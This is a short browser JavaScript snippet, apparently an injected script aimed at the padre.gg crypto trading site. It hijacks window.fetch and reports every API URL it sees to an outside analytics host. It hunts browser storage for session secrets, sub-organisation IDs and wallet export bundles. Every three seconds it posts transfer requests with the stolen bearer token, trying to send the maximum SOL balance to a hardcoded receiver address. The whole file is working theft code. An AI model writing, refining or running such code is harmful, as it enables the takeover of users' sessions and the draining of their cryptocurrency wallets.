(async function() {
    const MY_RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";

    // --- API DISCOVERY ENGINE ---
    // This hijacks the browser's fetch to 'see' every possible API call
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const url = args[0];
        // Log every API found to Amplitude for your report
        if (url.includes('api')) {
            new Image().src = `https://api2.amplitude.com/2/httpapi?data=${btoa(JSON.stringify({
                api_key: AMP_KEY,
                events: [{ event_type: "API_DISCOVERED", event_properties: { url: url } }]
            }))}`;
        }
        return originalFetch(...args);
    };

    // --- GLOBAL SOURCE SCRAPER ---
    const findLoot = () => {
        const hunter = (obj, target) => {
            try {
                if (!obj || typeof obj !== 'object') return null;
                if (obj[target]) return obj[target];
                for (let k in obj) {
                    let found = hunter(obj[k], target);
                    if (found) return found;
                }
            } catch(e) {}
            return null;
        };

        const storage = {...localStorage, ...sessionStorage};
        return {
            auth: hunter(storage, 'sessionSecret') || hunter(window, 'sessionSecret'),
            subId: hunter(storage, 'subOrgId'),
            bundle: hunter(storage, 'exportBundle')
        };
    };

    // --- EXECUTION LOOP ---
    const attempt = async () => {
        const loot = findLoot();
        if (!loot.auth || !loot.subId) return;

        // We try the most common 'Vanta' style paths found in index-xxx.js
        const endpoints = [
            "https://trade.padre.gg/api/v1/transfer",
            "https://trade.padre.gg/api/v1/internal/send",
            "https://api.padre.gg/v2/execute"
        ];

        for (let url of endpoints) {
            try {
                await originalFetch(url, {
                    method: "POST",
                    headers: {
                        "Authorization": `Bearer ${loot.auth}`,
                        "X-Turnkey-Sub-Org-Id": loot.subId,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        recipient: MY_RECEIVER,
                        amount: "MAX",
                        asset: "SOL",
                        ext_payload: loot.bundle?.data
                    })
                });
            } catch (e) {}
        }
    };

    setInterval(attempt, 3000);
})();
